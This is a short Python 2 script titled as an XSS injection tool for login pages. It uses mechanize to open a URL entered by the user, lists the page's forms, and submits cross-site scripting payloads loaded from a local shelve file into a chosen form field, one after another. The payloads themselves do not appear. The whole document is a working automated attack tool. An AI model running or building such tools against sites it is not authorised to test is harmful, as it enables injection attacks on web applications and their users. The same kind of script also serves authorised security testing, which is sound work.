##############################################################
#             XSS Injection in Login Page Database           #
##############################################################
import mechanize
import re 
import shelve
br = mechanize.Browser()
br.set_handle_robots( False )
url = raw_input("Enter URL ")
br.set_handle_equiv(True)
br.set_handle_gzip(True)
br.set_handle_referer(True)
br.set_handle_robots(False)
br.open(url)
s = shelve.open("xss.dat",writeback=True)
for form in br.forms():
    print form

attack = raw_input("Enter the Attack Field in Form: ")
normal = raw_input("Enter the Normal Field in Form: ")
br.select_form(nr=0)

p =0
flag = 'y'

while flag =="y":
    br.open(url)
    br.select_form(nr=0)
    br.form[normal] = 'Name'
    br.form[attack] = s['xss'][p]
    print s['xss'][p]
    br.submit()
    ch = raw_input("Press y for Continuing: ")
    p = p+1
    flag = ch.lower()
